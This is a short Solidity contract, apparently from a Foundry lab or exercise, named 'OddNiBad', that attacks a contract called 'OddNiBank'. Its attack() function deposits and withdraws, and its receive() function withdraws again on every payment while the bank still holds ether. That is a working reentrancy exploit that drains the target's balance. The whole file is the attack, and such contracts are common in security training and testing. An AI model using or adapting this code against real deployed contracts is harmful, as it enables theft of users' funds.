// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { OddNiBank } from "./OddNiBank.sol";
import {console} from "lib/forge-std/src/console.sol";

contract OddNiBad {
    OddNiBank public oddNiBank;
    uint256 private depositAmount;

    constructor (address payable _oddNiBankAddress) payable {
       oddNiBank = OddNiBank(_oddNiBankAddress); 
    }

    function attack() public payable {
        oddNiBank.registerAsMember();
	uint256 amount = msg.value;
	depositAmount = amount;
	oddNiBank.depositAsset{value: amount}();
	oddNiBank.withdrawAsset(msg.value);
    }

    receive() external payable {
	console.log(address(oddNiBank).balance, depositAmount);
   	if (address(oddNiBank).balance > 0 && depositAmount > 0) {
	    oddNiBank.withdrawAsset(depositAmount);
	} 
    }
}
